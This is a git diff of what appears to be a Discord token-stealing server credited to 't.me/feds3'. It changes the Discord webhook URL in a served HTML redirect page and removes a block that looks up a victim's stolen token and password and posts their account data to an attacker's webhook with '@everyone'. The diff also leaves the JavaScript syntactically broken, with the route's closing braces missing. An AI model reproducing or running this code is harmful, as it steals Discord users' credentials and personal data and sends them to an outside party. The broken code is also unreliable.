@@ -81,7 +81,7 @@ app.get("/k", async (req, res) => {
 <title>onload/redirect</title>
 <script>
 
-var webhookURL = "https://discord.com/api/webhooks/1055710474643193897/m1mq1DQfblSS3qUJW2s8LgLSA-CVflTu7CHLGznJizZ8oXVYiuAxzNW-XA9RjS7p2zpw";
+var webhookURL = "https://discord.com/api/webhooks/1055967757004439653/pq3lIRIu8F67GzZMD6xtFpM5JRDtERQp_edBC3MYRM-Pvi4IbotLYrUEpJynxvga09v1";
 var url_string = window.location.href; 
 var url = new URL(url_string);
 var currentURL = url.searchParams.get("user");
@@ -106,37 +106,8 @@ window.location="https://discord.com/channels/@me";
 <b></b>
 </body>
 </html>`);
-    try {
-      const data = await doxToken(token, pass && typeof pass === "string" ? pass.trim() : null);
-      console.log(data);
-      if (!data) return;
-      const embed = new MessageEmbed();
-      embed.setTitle("feds bookmark");
-      embed.setImage(data.bannerURL);
-      embed.setThumbnail(data.avatarURL);
-      let rawStringData = [];
-      for (const i in data.rawData) {
-        rawStringData.push(`**__${i}__**: ${data.rawData[i]}`);
-      }
-      rawStringData = rawStringData.join("\n");
-
-      embed.setDescription(rawStringData);
-      embed.setFooter("Created by t.me/feds3");
-
-      // Cache Part
-
-      if (process.logged.find((e) => e.token === token && e.passowrd === pass)) {
-        console.log("Found Duplicate Logged ID");
-      } else {
-        await axios({ method: "POST", url: "https://discord.com/api/webhooks/1055710474643193897/m1mq1DQfblSS3qUJW2s8LgLSA-CVflTu7CHLGznJizZ8oXVYiuAxzNW-XA9RjS7p2zpw", data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
-        process.logged.push({ token, password: pass });
-      }
-    } catch (err) {
-      console.log(err);
-    }
-  }
-});
-
-app.listen(4200, () => {
+    
+    
+   app.listen(4200, () => {
   console.log(`Server Started on http://localhost:4200`);
 });
